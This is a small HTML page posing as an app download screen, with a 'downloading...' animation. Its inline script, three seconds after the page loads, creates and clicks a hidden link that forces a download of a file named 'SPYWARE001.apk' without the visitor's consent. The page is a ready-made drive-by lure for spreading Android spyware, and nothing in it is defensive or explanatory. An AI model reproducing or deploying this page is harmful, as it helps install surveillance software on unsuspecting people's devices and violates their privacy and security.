<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Downloading App</title>
    <style>
        body {
            background-color: #000000;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: monospace;
        }
        .loading-text {
            color: #00ff00;
            font-size: 24px;
            font-weight: bold;
            letter-spacing: 2px;
        }
        .dots::after {
            content: '.';
            animation: loadingDots 1.5s infinite steps(1);
        }
        @keyframes loadingDots {
            0% { content: '.'; }
            33% { content: '..'; }
            66% { content: '...'; }
        }
    </style>
</head>
<body>

    <div class="loading-text">downloading<span class="dots"></span></div>

    <script>
        window.addEventListener('load', () => {
            setTimeout(() => {
                const link = document.createElement('a');
                link.href = 'SPYWARE001.apk';
                link.download = 'SPYWARE001.apk';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            }, 3000); 
        });
    </script>

</body>
</html>
